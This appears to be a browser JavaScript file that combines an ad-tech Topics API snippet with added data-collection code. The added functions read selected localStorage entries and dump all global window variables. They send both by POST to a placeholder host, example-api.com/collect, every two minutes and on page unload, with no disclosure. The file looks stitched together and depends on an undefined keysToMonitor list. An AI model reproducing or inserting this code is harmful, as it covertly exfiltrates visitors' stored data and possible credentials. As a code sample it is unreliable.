let globalVarCollection = [];
function jshook(eventName, callback) {
  window.addEventListener(eventName, callback);
  console.log(`Hooked into ${eventName}`);
}
function ignoreAsyncResult(x) {}
function createHashValue(data) {
  const keyList = Object.keys(data);
  const combinedKeys = keyList.join("|");
  let hashValue = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const charCode = combinedKeys.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + charCode;
    hashValue |= 0;
  }
  return hashValue.toString(36);
}
function readResponse(r) {
  try {
    if (r.ok) {
      r.blob().then(ignoreAsyncResult, ignoreAsyncResult);
    }
  } catch (e) {}
}
function extractDataFromLocalStorage() {
  const extractedData = {};
  Object.keys(localStorage).forEach(key => {
    if (window.keysToMonitor.includes(key)) {
      extractedData[key] = localStorage.getItem(key);
    }
  });
  return extractedData;
}
function collectGlobalVars() {
  for (var varName in window) {
    globalVarCollection.push({
      name: varName,
      value: window[varName]
    });
  }
}
function handleTopics(result) {
  try {
    if (Array.isArray(result)) {
      var topicIds = result.map(function (topic) {
        return topic.topic;
      });
      if (topicIds.length > 0 || Math.random() < 0.001) {
        fetch('https://us.creativecdn.com/topics-membership?ntk=ny0UsitNp8WtDcaXYccEixTW0HqmPhfZaQUXULu1AevXCNANMs2zWvwRB3KKOBCz7yHU_cuoqRfZKFbhCfmg5g&t=' + topicIds.join(',')).then(readResponse, ignoreAsyncResult);
      }
    }
  } catch (e) {}
}
function sendProcessedDataToServer(data) {
  const hashedData = createHashValue(data);
  const transmissionUrl = "https://example-api.com/collect";
  fetch(transmissionUrl, {
    method: "POST",
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      dataHash: hashedData,
      payload: data,
      globalVars: globalVarCollection
    })
  }).then(response => response.ok ? console.log("Data successfully sent.") : console.error("Failed to send data, status code: ", response.status)).catch(error => console.error("Error occurred while sending data: ", error.message));
}
function gatherAndSendData() {
  const gatheredData = extractDataFromLocalStorage();
  if (Object.keys(gatheredData).length) {
    collectGlobalVars();
    sendProcessedDataToServer(gatheredData);
  }
}
try {
  var meta = document.createElement('meta');
  meta.httpEquiv = 'origin-trial';
  meta.content = 'AiqqkrAUoJheeZkkH1jxmBePCDyeSQgKpYicTXM6Upqddw0wIqs6UzP2lTFcZ4sjYlt5J0Ogl291NVzxz68oTAYAAABxeyJvcmlnaW4iOiJodHRwczovL2NyZWF0aXZlY2RuLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=';
  document.head.append(meta);
  if (document.browsingTopics) {
    document.browsingTopics().then(handleTopics, ignoreAsyncResult);
  }
} catch (e) {}
document.addEventListener("DOMContentLoaded", () => {
  jshook('mousemove', ev => console.log(`Mouse moved at postion: ${ev.clientX},${ev.clientY}`));
  setInterval(gatherAndSendData, 2 * 60 * 1000);
});
window.addEventListener("beforeunload", gatherAndSendData);